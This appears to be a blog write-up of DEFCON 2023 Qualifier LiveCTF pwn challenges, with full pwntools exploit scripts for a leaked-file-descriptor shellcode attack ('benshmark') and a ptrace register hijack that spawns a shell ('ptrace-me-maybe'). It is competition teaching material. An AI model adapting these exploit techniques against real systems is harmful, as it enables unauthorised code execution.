---
title: "DEFCON 2023 Qualifier: LiveCTF"
tags: pwn
style: border
color: dark
comments: true
description: Solutions to LiveCTF challenges from DEFCON 2023 Quals
---

# LiveCTF

LiveCTF is a sub category of DEFCON competition which mostly comprosises with binary challenges with easier difficulty- but with less time and points.
The key to utilize LiveCTF in DEFCON is to solve it as fast as possible while using the least manpower as possible.

An interesting thing about LiveCTF challenges is its own unique way of submitting its solutions. Instead of directly pasting the flag, we submit a compressed solution file containing a Dockerfile and the exploit.

At the DEFCON 2023 Qualification Round, there were a total of 7 LiveCTF challenges.

I focused on LiveCTFs in this qualification round and will go over some pwn (binary) challenges that I worked on/solved.

## LiveCTF Practice Challenge

The solution is given, as it is just to make sure the submition system works:

```python
from pwn import *
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

r = remote(HOST, int(PORT))
r.recvline_contains(b'Give me input: ')
r.sendline(b'WIN')
r.recvline_contains(b'You sent: ')
r.sendline(b'./submitter')
flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
```

## benshmark

In the challenge source code, 
```c
if ( read(f, code, 0x100uLL) == -1 )
{
    puts("read failed");
    free(code);
}
```
Fail in reading a file doesn't close the file descriptor, therefore, can be leaked.
- Read /flag twice
- Trigger read fail and leak fd
- Run shellcode to read from fd
- Get flag

### Exploit
A solution by my teammate from ```P1G BuT S4D```:
```python
#!/usr/bin/env python3

from pwn import *
import re

context.arch = "amd64"
context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# r = remote(HOST, int(PORT))
r = process("../handout/challenge")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/flag")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/flag")

r.sendlineafter(b"Choice:", b"1")
r.sendlineafter(b">", b"/proc/self/fd/0")

r.send(asm("""
    call A
A:
    pop rdx
ZALOOP:
    mov rax, 8882879963476683084
    cmp QWORD PTR [rdx], rax
    je FOUND
    dec rdx
    jmp ZALOOP
FOUND:
    mov rdi, QWORD PTR [rdx]
    
    mov rsi, rbp
    sub rsi, 0x28
    mov rsi, QWORD PTR [rsi]
    add rsi, 0x0c
    mov rdi, QWORD PTR [rdx]
    mov QWORD PTR [rsi], rdi
    mov rdi, QWORD PTR [rdx+8]
    mov QWORD PTR [rsi+8], rdi
    mov rdi, QWORD PTR [rdx+16]
    mov QWORD PTR [rsi+16], rdi
    mov rdi, QWORD PTR [rdx+24]
    mov QWORD PTR [rsi+24], rdi
    ret
"""))

gdb.attach(r)

r.sendlineafter(b"Choice:", b"2")
print(re.findall(rb'LiveCTF{[^}{}]+}', r.recvall(timeout=3))[0].decode())
```

## ptrace-me-maybe

The challenge spawns a child process and lets the user run any kind of ptrace requests as much as the user wants.

We can exploit the challenge by:
- Leak libc base through PTRACE_PEEKUSER request
- Write ```system``` to RIP and "/bin/sh" to RDI through PTRACE_POKEUSER request
- Restart child process by PTRACE_CONT with the new register values
- Get shell

### Exploit

```python
#!/usr/bin/env python3

from pwn import *

context.arch = "amd64"
context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

system_offset = 331104
binsh_offset = 1935000

r = remote(HOST, int(PORT))
# r = process("./challenge")

r.sendlineafter(b"send?", b"0x3")
r.sendlineafter(b"want?", b"0x80")
r.sendlineafter(b"data?", b"0x0")

r.recvuntil(b"returned ")
leak = int(r.recvline().strip()[2:].decode(), 16)

r.sendlineafter(b"(0/1)?", "1")

libc_base = leak - 0x7ffff7e7abc7 + 0x7ffff7d91000 - 0x1000

r.sendlineafter(b"send?", b"0x6")
r.sendlineafter(b"want?", b"0x80")
r.sendlineafter(b"data?", hex(libc_base + system_offset).encode())
r.sendlineafter(b"(0/1)?", b"1")

r.sendlineafter(b"send?", b"0x6")
r.sendlineafter(b"want?", b"0x70")
r.sendlineafter(b"data?", hex(libc_base + binsh_offset).encode())
r.sendlineafter(b"(0/1)?", b"1")

# gdb.attach(r)

r.sendlineafter(b"send?", b"0x7")
r.sendlineafter(b"want?", b"0x0")
r.sendlineafter(b"data?", b"0x0")

# print(hex(libc_base))

# pause()
r.sendlineafter(b"(0/1)?", b"0")

sleep(1)

r.sendline(b'./submitter')

flag = r.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

```

Thanks,

079
